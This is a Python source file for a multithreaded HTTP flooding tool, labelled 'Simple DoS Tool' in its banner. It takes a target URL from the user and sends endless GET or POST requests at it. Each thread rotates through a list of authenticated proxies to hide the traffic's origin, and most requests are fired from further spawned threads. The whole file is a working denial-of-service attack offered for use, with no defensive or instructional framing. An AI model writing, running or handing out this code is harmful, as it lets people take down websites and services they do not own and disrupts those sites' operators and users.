# -*- coding: utf-8 -*-
import random
import requests
import time
import threading
import warnings
from urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)
PROXY_FILE = "proxies.txt"
PAYLOAD_FILE = "p.txt"
GREEN = '\033[92m' 
RED = '\033[91m'
CYAN = '\033[96m'
RESET = '\033[0m'

print_lock = threading.Lock()

def colored(text, color):
    return f"{color}{text}{RESET}"

def load_proxies():
    try:
        with open(PROXY_FILE, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

def load_payload():
    with open(PAYLOAD_FILE, "r") as f:
        return f.read()

def build_proxy(proxy_line):
    try:
        ip, port, user, password = proxy_line.split(":")
        proxy_url = f"http://{user}:{password}@{ip}:{port}"
        return ip, {
            "http": proxy_url,
            "https": proxy_url
        }
    except ValueError:
        raise ValueError(f"Invalid proxy format: {proxy_line}. Expected ip:port:user:pass")

def sender_thread(url, method, payload, proxies_list, thread_id, delay=2):
    count = 0
    while True:
        count += 1
        if proxies_list:
            proxy_line = random.choice(proxies_list)
            try:
                ip, proxies = build_proxy(proxy_line)
            except ValueError as e:
                with print_lock:
                    print(colored(f"[-] Thread {thread_id} Proxy error: {str(e)}", RED))
                time.sleep(delay)
                continue
        else:
            ip = "Local IP"
            proxies = None
        
        with print_lock:
            print(colored(f"[+] Thread {thread_id} | Request {count}: Proxy IP: {ip}", GREEN))
        
        if count == 1 or count % 20 == 0:
            try:
                if method == 'GET':
                    r = requests.get(url, proxies=proxies, timeout=15, verify=False)
                else:
                    r = requests.post(url, proxies=proxies, data=payload, timeout=15, verify=False)
                with print_lock:
                    print(colored(f"[*] Thread {thread_id} | Status: {r.status_code}", CYAN))
                    if count == 1:
                        print(colored(f"[*] Thread {thread_id} | Response (first 300 chars):", CYAN))
                        print(r.text[:300])
            except Exception as e:
                with print_lock:
                    print(colored(f"[-] Thread {thread_id} | Request error: {str(e)}", RED))
        else:
            def send():
                try:
                    if method == 'GET':
                        requests.get(url, proxies=proxies, timeout=15, verify=False)
                    else:
                        requests.post(url, proxies=proxies, data=payload, timeout=15, verify=False)
                except Exception as e:
                    with print_lock:
                        print(colored(f"[-] Thread {thread_id} | Background request error: {str(e)}", RED))
            
            t = threading.Thread(target=send)
            t.start()
        
        time.sleep(delay)

if __name__ == "__main__":
    print(colored(" ░█████   ░█████         ░█████               ░████           ░██████████", RED))  
    print(colored(" ░░██████ ░░███          ░░███                ░░███           ░░███░░░░███", RED))
    print(colored("  ░███░███ ░███   ██████  ░███████  █████ ████ ░███  ░██████   ░███   ░░███", RED))
    print(colored("  ░███░░███░███ ░███░░███ ░███░░███░░███ ░███  ░███  ░░░░░███  ░███    ░███", RED))
    print(colored("  ░███ ░░██████ ░███████  ░███ ░███ ░███ ░███  ░███   ███████  ░███    ░███", RED))
    print(colored("  ░███  ░░█████ ░███░░░   ░███ ░███ ░███ ░███  ░███ ░███░░███  ░███    ███ ", RED))
    print(colored(" ░█████  ░░█████░░██████ ░████████  ░░████████ █████░░████████░██████████    ", RED))
    print(colored(" ░░░░░    ░░░░░  ░░░░░░  ░░░░░░░░    ░░░░░░░░ ░░░░░  ░░░░░░░░ ░░░░░░░░░░   ", RED))
    print(colored("                                  Simple DoS Tool ", GREEN))
    print(colored("                                    Made with love by RomanAndBusia", GREEN))
    target_url = input("Enter URL: ").strip()
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
        with print_lock:
            print(colored(f"[*] Added HTTPS scheme: {target_url}", CYAN))
    
    method = input("Enter method (GET or POST): ").strip().upper()
    if method not in ['GET', 'POST']:
        with print_lock:
            print(colored("Error: Invalid method. Must be GET or POST.", RED))
        exit(1)
    
    num_threads = int(input("Enter number of threads: ").strip())
    if num_threads < 1:
        with print_lock:
            print(colored("Error: Number of threads must be at least 1.", RED))
        exit(1)
    
    delay = float(input("Enter delay between requests per thread (ms): ").strip()) / 1000
    
    payload = None
    if method == 'POST':
        try:
            payload = load_payload()
        except FileNotFoundError:
            with print_lock:
                print(colored("Error: p.txt not found.", RED))
            exit(1)
    
    proxies_list = load_proxies()
    if not proxies_list:
        with print_lock:
            print(colored("[*] No proxies found, using local IP.", CYAN))
    
    threads = []
    for i in range(1, num_threads + 1):
        t = threading.Thread(target=sender_thread, args=(target_url, method, payload, proxies_list, i, delay))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()